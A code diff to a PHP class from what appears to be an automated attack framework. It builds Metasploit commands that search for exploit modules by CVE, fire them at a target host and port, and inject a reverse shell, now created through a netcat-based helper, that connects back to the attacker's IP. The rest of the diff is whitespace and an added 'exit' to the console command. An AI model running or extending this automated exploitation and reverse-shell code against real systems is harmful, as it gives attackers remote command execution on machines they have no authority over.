@@ -32,7 +32,7 @@ class SERVICE4COM extends AUTH {
                     
                     switch ($payload){
                         case "php/exec" :
-                                $cmd = "use $file_exploit;set RHOSTS $target_ip;set RPORT $target_port;set payload php/exec;set CMD \"%CMD%\";run";
+                                $cmd = "use $file_exploit;set RHOSTS $target_ip;set RPORT $target_port;set payload php/exec;set CMD \"%CMD%\";run;exit";
                            break;
                             }
                     
@@ -48,13 +48,14 @@ class SERVICE4COM extends AUTH {
         }
     }
     
+    
     public function msf2search2exec($cve){
         $cve = trim($cve);
-
+        
         $files_exploit = array();
         $this->ssTitre(__FUNCTION__);
         $shell = "/bin/bash";
-
+        
         $attacker_ip = $this->ip4addr4target($this->ip);
         
         $files_exploit = array_filter($this->msf2search($cve)) ;
@@ -66,19 +67,19 @@ class SERVICE4COM extends AUTH {
                     $this->article("EXEC $file_exploit", $cve);
                     $cmd_rev = $this->msf2exec($file_exploit,$this->ip,$this->port,$attacker_ip,$lport);
                     if (!empty($cmd_rev)){
-                    $templateB64_shell = base64_encode(str_replace("%CMD%", "%SHELL%", $cmd_rev));
-                    
-                    $rev = $this->rev8sh($attacker_ip, $lport, $shell) ;
-                    $cmd = str_replace("%CMD%", $rev, $cmd_rev);
-                    $lprotocol = 'T';
-                    $type = 'server';
-                    $this->service4lan($cmd, $templateB64_shell, $lport, $lprotocol,$type);
+                        $templateB64_shell = base64_encode(str_replace("%CMD%", "%SHELL%", $cmd_rev));
+                        
+                        $rev = $this->rev8nc($attacker_ip, $lport, $shell) ;
+                        $cmd = str_replace("%CMD%", $rev, $cmd_rev);
+                        $lprotocol = 'T';
+                        $type = 'server';
+                        $this->service4lan($cmd, $templateB64_shell, $lport, $lprotocol,$type);
                     }
                     
                 }
             }
         }
-
+        
     }
 
     
